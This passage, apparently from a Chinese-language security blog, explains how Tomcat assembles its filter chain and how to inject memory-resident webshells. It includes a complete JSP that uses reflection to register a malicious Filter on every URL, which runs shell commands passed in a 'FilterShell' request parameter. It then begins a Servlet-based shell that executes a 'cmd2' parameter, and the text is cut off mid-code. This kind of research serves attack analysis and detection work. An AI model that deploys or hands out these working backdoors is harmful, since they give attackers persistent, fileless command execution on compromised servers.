class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletSupportsAsync<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.ASYNC_SUPPORTED"</span><span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span> <span class="token operator">&amp;&amp;</span> response <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletResponse</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Globals</span><span class="token punctuation">.</span>IS_SECURITY_ENABLED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token class-name">Principal</span> principal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>request<span class="token punctuation">,</span> response<span class="token punctuation">}</span><span class="token punctuation">;</span>                 <span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span><span class="token function">doAsPrivilege</span><span class="token punctuation">(</span><span class="token string">"service"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>servlet<span class="token punctuation">,</span> classTypeUsedInService<span class="token punctuation">,</span> args<span class="token punctuation">,</span> principal<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                 <span class="token keyword">this</span><span class="token punctuation">.</span>servlet<span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ServletException</span> <span class="token operator">|</span> <span class="token class-name">RuntimeException</span> <span class="token operator">|</span> <span class="token class-name">IOException</span> var17<span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">throw</span> var17<span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var18<span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token class-name">Throwable</span> e <span class="token operator">=</span> <span class="token class-name">ExceptionUtils</span><span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>var18<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token class-name">ExceptionUtils</span><span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filterChain.servlet"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationDispatcher</span><span class="token punctuation">.</span>WRAP_SAME_OBJECT<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 lastServicedRequest<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 lastServicedResponse<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到通过filter.doFilter(request, response, this);来调用了doFilter，然后再向前看如何获得fiter：Filter filter = filterConfig.getFilter(); 前面已经简单说过了filterConfigs是什么了，一个filterConfig是一个ApplicationFilterConfig的实现类，在ApplicationFilterChain中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">[</span><span class="token punctuation">]</span> filters <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是将值传入，那么需要知道在哪初始化ApplicationFilterChain；在StandardWrapperValve#invoke中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ApplicationFilterChain</span> filterChain <span class="token operator">=</span> <span class="token class-name">ApplicationFilterFactory</span><span class="token punctuation">.</span><span class="token function">createFilterChain</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> wrapper<span class="token punctuation">,</span> servlet<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跟进createFilterChain，需要关注StandardContext、filterChain、FilterMaps、FilterConfig这些的操作。<br>代码通过</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span>wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来获取当前的StandardContext，并通过</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">FilterMap</span><span class="token punctuation">[</span><span class="token punctuation">]</span> filterMaps <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来获得filterMap，通过filter名字得到对应的filterConfig：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后通过</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加入到filterChain中，，思路比较清晰，只要知道如何将我们想要的Filter信息添加到filterConfigs中，就可以添加到filterChain，从而触发。<br>直接看debug信息可能直观一点：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/21933819/1666088263913-e3e631ca-fd82-4d50-9eca-5a879ca93aab.png#clientId=ucf2cda4e-14de-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=450&amp;id=u03ac92a2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=450&amp;originWidth=1113&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=67359&amp;status=done&amp;style=none&amp;taskId=u5d62e3e7-3a58-426b-9bbd-451b22978ce&amp;title=&amp;width=1113" alt="image.png"><br>跟刚开始介绍的一样，filterDef需要对应的filter、filterName、FilterClass；filterMaps则需要filterName、urlPattern、dispatcherMapping。<br>还有一点是获得StandardContext，有许多资源可以加以利用，方法很多，简单写两种大佬的demo：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取ApplicationContextFacade类</span><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span><span class="token class-name">Field</span> appContextField <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>appContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//反射获取ApplicationContext类属性context为StandardContext类</span><span class="token class-name">Field</span> standardContextField <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>standardContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standardContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取servletContext</span><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationContextFacade</span> applicationContextFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContextFacade</span><span class="token punctuation">)</span> servletContext<span class="token punctuation">;</span><span class="token class-name">Field</span> applicationContextFacadeContext <span class="token operator">=</span> applicationContextFacade<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>applicationContextFacadeContext<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取applicationContext</span><span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> applicationContextFacadeContext<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContextFacade<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> applicationContextContext <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>applicationContextContext<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取standardContext</span><span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> applicationContextContext<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是注入jsp的代码了：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContextFacade"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.HashMap"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">class</span> <span class="token class-name">FIlterShell</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter初始化"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> <span class="token class-name">FilterShell</span> <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"FilterShell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FilterShell</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">FilterShell</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationContextFacade</span> applicationContextFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContextFacade</span><span class="token punctuation">)</span> servletContext<span class="token punctuation">;</span>    <span class="token class-name">Field</span> applicationContextFacadeContext <span class="token operator">=</span> applicationContextFacade<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    applicationContextFacadeContext<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> applicationContextFacadeContext<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContextFacade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Field</span> applicationContextContext <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    applicationContextContext<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> applicationContextContext<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FIlterShell</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FIlterShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token class-name">FiterName</span> <span class="token operator">=</span> <span class="token string">"FilterMemShell"</span><span class="token punctuation">;</span>    <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token class-name">FiterName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token class-name">FiterName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Field</span> <span class="token class-name">Config</span> <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Config</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashMap</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">)</span> <span class="token class-name">Config</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>    filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">FiterName</span><span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  不管获得StandardContext还是添加filterConfigs其实都有不少的代码实现，但思路大概差不太多，这里只是写一种方法。</p><h2 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h2><p>  在开始时看到有师傅用两个接口来实现内存马，分别是Servlet和HttpServlet，HttpServlet在Servlet的基础上添加了HTTP协议的处理方法，不在直接使用Servlet的service方法，而是对于Http的不同请求，分别调用doGet和doPost方法。虽然接口不同，但调用到底层差不多，这里选择实现HttpServlet来分析。<br>编写Servlet恶意类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletShell</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> command2 <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>command2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                n<span class="token 